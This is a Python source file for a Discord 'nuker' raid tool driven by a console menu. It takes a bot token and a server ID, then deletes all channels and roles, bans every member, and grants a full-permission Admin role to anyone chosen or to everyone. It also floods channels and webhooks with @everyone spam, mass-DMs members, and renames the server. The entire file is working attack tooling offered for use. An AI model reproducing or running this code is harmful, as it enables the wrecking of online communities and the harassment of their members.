import os
from colorama import Fore, init
import time
import colorama
import discord
from discord.ext import commands
import random
import config
import urllib.request
import asyncio
import time
import requests
from discord import Game
from discord import Activity, ActivityType
import webbrowser

init()

colorama.init(autoreset=True)

bot_token = input(f"{Fore.RED}[{Fore.RED}{Fore.BLACK}Input Token{Fore.BLACK}{Fore.RED}]{Fore.RED}{Fore.RESET} > ")
server_id = input(f"{Fore.RED}[{Fore.RED}{Fore.BLACK}Input Server id{Fore.BLACK}{Fore.RED}]{Fore.RED}{Fore.RESET} > ")

intents = discord.Intents.all()  
bot = commands.Bot(command_prefix='!', intents=intents)


def clear():
    os.system('cls') 

@bot.event
async def on_ready():
    print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Logged in as {bot.user.name}')
    print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Server ID: {server_id}')

    server = bot.get_guild(int(server_id))
    if server:
        print(f'{Fore.RED}{Fore.RESET}+{Fore.RED}{Fore.RESET}  Bot is in the specified server ({server.name})')
        

    else:
        print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Bot is not in the specified server')
        return
    
    from config import BOT_PRESENCE
    presence_type = getattr(ActivityType, BOT_PRESENCE["type"].lower())
    await bot.change_presence(activity=Activity(type=presence_type, name=BOT_PRESENCE["text"]))


    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        choice = input(f"""
{Fore.RED}
                        $$\                                         
                        \__|                                       
                        $$\  $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\  
                        $$ |$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
                        $$ |$$ /  $$ |$$$$$$$$ |\$$$$$$\  $$ /  $$ |
                        $$ |$$ |  $$ |$$   ____| \____$$\ $$ |  $$ |
                        $$ |$$$$$$$  |\$$$$$$$\ $$$$$$$  |$$$$$$$  |
                        \__|$$  ____/  \_______|\_______/ $$  ____/ 
                            $$ |                          $$ |      
                            $$ |                          $$ |      
                            \__|                          \__|    .gg/local
     
                            {Fore.RED}[{Fore.RED}{Fore.BLACK}1{Fore.BLACK}{Fore.RED}] Kill Server         {Fore.RED}[{Fore.RED}{Fore.BLACK}6{Fore.BLACK}{Fore.RED}] get admin
                            {Fore.RED}[{Fore.RED}{Fore.BLACK}2{Fore.BLACK}{Fore.RED}] spam webhook        {Fore.RED}[{Fore.RED}{Fore.BLACK}7{Fore.BLACK}{Fore.RED}] dm all
                            {Fore.RED}[{Fore.RED}{Fore.BLACK}3{Fore.BLACK}{Fore.RED}] create Roles        {Fore.RED}[{Fore.RED}{Fore.BLACK}8{Fore.BLACK}{Fore.RED}] create channel
                            {Fore.RED}[{Fore.RED}{Fore.BLACK}4{Fore.BLACK}{Fore.RED}] delete roles        {Fore.RED}[{Fore.RED}{Fore.BLACK}9{Fore.BLACK}{Fore.RED}] delete channel
                            {Fore.RED}[{Fore.RED}{Fore.BLACK}5{Fore.BLACK}{Fore.RED}] ban all            
        
{Fore.RED}[{Fore.RED}{Fore.BLACK}Input{Fore.BLACK}{Fore.RED}]{Fore.RED}{Fore.RESET} > """)
        
        if choice == '1':
            await nuke(server_id)
            await auto_raid(server_id)
        elif choice == '2':
            await webhook_spam(server_id)   
        elif choice == '3':
            await create_roles(server_id)
        elif choice == '4':
            await delete_roles(server_id)
        elif choice == '5':
            await ban_all(server_id)   
        elif choice == '6':
            await get_admin(server_id) 
        elif choice == '7':
            await dm_all(server_id)  
        elif choice == '8':
            await create_channels(server_id) 
        elif choice == '9':
            await delete_channels(server_id)                 
        elif choice == '10':
            await change_server(server_id)
        else:
            print("wrong choice cartel is chasing u")
            break


async def delete_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Server not found.")
        return

    confirm = await asyncio.to_thread(input, (f"{Fore.RED}u wanna delete every channel? y/n{Fore.RESET} >> ") )
    confirm = confirm.lower()
    if confirm != 'y':
        print("Operation canceled.")
        return

    try:
        channels = guild.channels
        delete_tasks = [channel.delete() for channel in channels]
        await asyncio.gather(*delete_tasks)
        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} All channels deleted successfully.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Error deleting channels: {e}")

async def delete_roles(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Server not found.")
        return

    confirm = await asyncio.to_thread(input, f"{Fore.RED}Do you want to delete all roles? y/n{Fore.RESET} >> ")
    confirm = confirm.lower()
    if confirm != 'y':
        print("Operation canceled.")
        return

    roles_to_delete = [role for role in guild.roles if role != guild.default_role]

    tasks = []
    for role in roles_to_delete:
        tasks.append(delete_role(role))

    results = await asyncio.gather(*tasks)

    for role, success in zip(roles_to_delete, results):
        if success:
            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Deleted role {role.id}")
        else:
            print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to delete role {role.id}")

async def delete_role(role):
    try:
        await role.delete()
        return True
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to delete role {role.id}. Missing permissions.")
        return False
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to delete role {role.id} due to HTTPException: {e}")
        return False


async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  
            channel_futures = [delete_channel(channel) for channel in guild.channels]

            role_futures = [delete_role(role) for role in guild.roles]

            channel_results = await asyncio.gather(*channel_futures)
            role_results = await asyncio.gather(*role_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)


            print("[+] successfully deleted")
        else:
            print("[-] Guild not found.")
    except Exception as e:
        print(f"[-] Error: {e}")




async def create_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print("Server not found.")
        return

    num_channels = await asyncio.to_thread(input, (f"{Fore.RED}how many channels{Fore.RESET} >> "))
    try:
        num_channels = int(num_channels)
    except ValueError:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Invalid number. Please enter a numeric value.")
        return

    base_name = await asyncio.to_thread(input, (f"{Fore.RED}channel names{Fore.RESET} >> "))

    tasks = []
    for i in range(num_channels):
        channel_name = f"{base_name}"
        tasks.append(create_text_channel(guild, channel_name))

    await asyncio.gather(*tasks)

# Function to create a text channel
async def create_text_channel(guild, channel_name):
    try:
        channel = await guild.create_text_channel(channel_name)
        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} {Fore.RED}{channel.id}{Fore.RESET} created successfully")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to create channel '{channel_name}': {e}")



async def spam_channel(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input(f"{Fore.RED}how many messages?{Fore.RESET} >> "))
            message_content = input(f"{Fore.RED}cusom message or embed{Fore.RESET} >> ")

            include_everyone = False
            if message_content.lower() == 'embed':
                include_everyone_input = input(f"{Fore.RED}@everyone y/n{Fore.RESET} >>").lower()
                include_everyone = include_everyone_input == 'y'

            start_time_total = time.time()
            tasks = [
                send_messages_to_channels(channel, num_messages, message_content, include_everyone)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
        else:
            print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Error: {e}")

async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            if message_content.lower() == 'embed':
                await send_embed(channel, include_everyone)
            else:
                await channel.send(message_content)
                print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Message Sent to {channel.name}: {message_content}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET}  Can't send messages to {channel.name}: {e}")

async def send_embed(channel, include_everyone=False):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await channel.send(content=message, embed=embed)
        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Embed Sent to {channel.name}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't send embed to {channel.name}: {e}")


from config import NO_BAN_KICK_ID

async def ban_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Server not found.")
        return

    confirm = await asyncio.to_thread(input, (f"{Fore.RED}ban all members? y/n{Fore.RESET} >> "))
    confirm = confirm.lower()
    if confirm != "y":
        print("Operation canceled.")
        return

    ban_tasks = []
    for member in guild.members:
        if member != bot.user:
            ban_tasks.append(ban_member(member))

    try:
        await asyncio.gather(*ban_tasks)
        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} All members banned successfully.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to ban members. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to ban members due to HTTPException: {e}")

async def ban_member(member):
    try:
        await member.ban(reason="Mass ban initiated by bot", delete_message_days=0)
        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} {member.id} got banned.")
    except discord.Forbidden:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to ban {member.name}#{member.discriminator}. Missing permissions.")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to ban {member.name}#{member.discriminator} due to HTTPException: {e}")

    
async def create_roles(server_id):
    try:
        guild = bot.get_guild(int(server_id))
    except ValueError:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Invalid server ID. Please enter a numeric ID.")
        return

    if guild is None:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Server not found.")
        return

    num_roles = await asyncio.to_thread(input, (f"{Fore.RED}how many roles?{Fore.RESET} >> "))
    try:
        num_roles = int(num_roles)
    except ValueError:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Invalid number. Please enter a numeric value.")
        return

    base_name = await asyncio.to_thread(input, (f"{Fore.RED}role names{Fore.RESET} >> "))

    # Gather all role creation tasks into a list
    role_creation_tasks = []
    for i in range(num_roles):
        role_name = f"{base_name}"
        role_creation_tasks.append(guild.create_role(name=role_name))

    try:
        # Await all role creation tasks
        created_roles = await asyncio.gather(*role_creation_tasks)
        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} All roles created successfully:")
        for role in created_roles:
            print(f"- {role.name}")
    except discord.HTTPException as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Failed to create roles due to HTTPException: {e}")

async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            message_content = input(f"{Fore.RED}message to everyone{Fore.RESET} >> ")

            members_sent = 0
            members_fail = 0

            start_time_total = time.time()  
            for member in guild.members:
                if not member.bot:
                    try:
                        start_time_member = time.time() 
                        await member.send(message_content)
                        end_time_member = time.time() 
                        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Message Sent to {member.name} ({member.id}) - Time taken: {end_time_member - start_time_member:.2f} seconds")
                        members_sent += 1
                    except Exception as e:
                        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't send message to {member.name}: {e}")
                        members_fail += 1

            end_time_total = time.time()  
            print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Command Used: DM All - {members_sent} messages sent, {members_fail} messages failed - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
        else:
            print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Error: {e}")


from config import NO_BAN_KICK_ID

async def kick_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input(f"{Fore.RED}kick all members y/n{Fore.RESET} ").lower()
            if confirm == "y":
                start_time_total = time.time()
                tasks = [
                    kick_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()

                members_kicked = results.count(True)
                members_failed = results.count(False)

                print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} - {members_kicked} members kicked, {members_failed} members not kicked - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
            else:
                print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Kick all operation canceled.")
        else:
            print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Error: {e}")

async def kick_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.kick()
            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Member {member.name} kicked")
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Member {member.name} is in the whitelist, no kick.")
            return False
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't kick {member.name}: {e}")
        return False
    
async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input(f"{Fore.RED}User id or enter for everyone{Fore.RESET} >> ")

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()  

            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())

            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()  
                            await member.add_roles(admin_role)
                            end_time_member = time.time()  
                            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Admin role granted to {member.name} - Time taken: {end_time_member - start_time_member:.2f} seconds")
                    except Exception as e:
                        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't grant admin role to {member.name}: {e}")

                end_time_total = time.time() 
                print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Command Used: Get Admin - Admin role granted to the entire server - Total Time taken: {end_time_total - start_time_total:.2f} seconds")

            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Admin role granted to {target_user.name} - Time taken: {end_time_target_user - start_time_target_user:.2f} seconds")
                        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Command Used: Get Admin - Admin role granted to the entire server - Total Time taken: {end_time_target_user - start_time_target_user:.2f} seconds")
                    else:
                        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} User with ID {user_id_or_all} not found.")

                except ValueError:
                    print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Invalid user ID. Please enter a valid user ID or press Enter for the entire server.")

        else:
            print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Error: {e}")


async def change_server(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            server_config = config.SERVER_CONFIG

            new_name = input(f"{Fore.RED}new server name or enter = automatic{Fore.RESET} >>") or server_config['new_name']
            new_icon = input(f"{Fore.RED}url for new server pfp or enter = automatic{Fore.RESET} >> ") or server_config['new_icon']
            new_description = input(f"{Fore.RED}new server name or enter = automatic{Fore.RESET} >> ") or server_config['new_description']
            start_time_guild_changer = time.time()
            await guild.edit(name=new_name)
            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Server name changed")

            if new_icon:
                with urllib.request.urlopen(new_icon) as response:
                    icon_data = response.read()
                await guild.edit(icon=icon_data)
                print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Icon changed")

            await guild.edit(description=new_description)
            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Description changed")
            end_time_guild_changer = time.time()

            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Command Used: Change Server - Server information updated successfully - Total Time taken: {end_time_guild_changer - start_time_guild_changer:.2f} seconds")
        else:
            print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Error: {e}")

async def spam_webhooks(guild):
    try:
        webhook_config = config.WEBHOOK_CONFIG

        webhooks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_name = webhook_config["default_name"]
                webhook = await channel.create_webhook(name=webhook_name)
                print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Webhook Created for {channel.name}: {webhook.name} ({webhook.url})")
                webhooks.append(webhook)

        num_messages = int(input(f"{Fore.RED}number of messages{Fore.RESET} >> "))

        message_content = input(f"{Fore.RED}enter message or embed{Fore.RESET} >> ")

        include_everyone = False
        if message_content.lower() == 'embed':
            include_everyone_input = input(f"{Fore.RED}@everyone y/n{Fore.RESET} >> ").lower()
            include_everyone = include_everyone_input == 'yes'
        start_time_spam = time.time()
        tasks = [
            send_embed_webhook(webhook, num_messages, message_content, include_everyone)
            if message_content.lower() == 'embed'
            else send_regular_webhook(webhook, num_messages, message_content)
            for webhook in webhooks
        ]
        await asyncio.gather(*tasks)
        end_time_target_spam = time.time()

        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Command Used: Spam - {num_messages} messages sent via webhooks - Total Time taken: {end_time_target_spam - start_time_spam:.2f} seconds")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Error: {e}")

async def send_embed_webhook(webhook, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            await send_embed_webhook_message(webhook, include_everyone)
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't send messages via Webhook {webhook.name}: {e}")

async def send_embed_webhook_message(webhook, include_everyone):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await webhook.send(content=message, embed=embed)
        print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Embed Sent via Webhook {webhook.name}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't send embed via Webhook {webhook.name}: {e}")

async def send_regular_webhook(webhook, num_messages, message_content):
    try:
        for _ in range(num_messages):
            await webhook.send(content=message_content)
            print(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Message Sent via Webhook {webhook.name}: {message_content}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't send messages via Webhook {webhook.name}: {e}")

async def webhook_spam(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            await spam_webhooks(guild)
        else:
            print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Guild not found.")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Error: {e}")

from config import AUTO_RAID_CONFIG

def log_message(message):
    print((message))

async def delete_channel(channel):
    try:
        start_time = time.time()
        await channel.delete()
        end_time = time.time()
        log_message(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")
        return True
    except discord.NotFound:
        log_message(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Channel {channel.name} not found or already deleted.")
        return False
    except discord.Forbidden:
        log_message(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Permission denied to delete channel {channel.name}.")
        return False
    except Exception as e:
        log_message(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}  Error deleting channel {channel.name}: {e}")
        return False

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        log_message(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")
        return True
    except Exception as e:
        log_message(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't delete role {role.name}: {e}")
        return False

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        log_message(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Channel Created {new_channel.id} - Time taken: {end_time - start_time:.2f} seconds")
        return new_channel
    except Exception as e:
        log_message(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Can't create {channel_type} channel: {e}")
        return None
    
async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Message {i+1}/{num_messages} sent to channel {channel.name}")
        return True
    except Exception as e:
        log_message(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Can't send messages to channel {channel.name}: {e}")
        return False

    
async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = AUTO_RAID_CONFIG['num_messages']
            message_content = AUTO_RAID_CONFIG['message_content']

            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, message_content, False)  
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            log_message(f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
        else:
            log_message(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Guild not found.")
    except Exception as e:
        log_message(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Message coulnt be send to channel {e}")

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  

            num_channels = AUTO_RAID_CONFIG['num_channels']
            channel_type = AUTO_RAID_CONFIG['channel_type']
            channel_name = AUTO_RAID_CONFIG['channel_name']

            channel_futures = [delete_channel(channel) for channel in guild.channels]

            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            channel_results = await asyncio.gather(*channel_futures)
            create_channel_results = await asyncio.gather(*create_channel_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            channels_created = create_channel_results.count(True)
            channels_not_created = create_channel_results.count(False)

            await spam_channels(server_id)

            log_message(f"""{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET} Command Used: Create Channels - {channels_created} {channel_type} channels created, {channels_not_created} channels not created - Total Time taken: {end_time_total - start_time_total:.2f} seconds""")

        else:
            log_message(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Guild not found.")
    except Exception as e:
        log_message(f"{Fore.RED}[{Fore.RESET}-{Fore.RED}]{Fore.RESET} Channel couldnt be deleted {e}") 


bot.run(bot_token)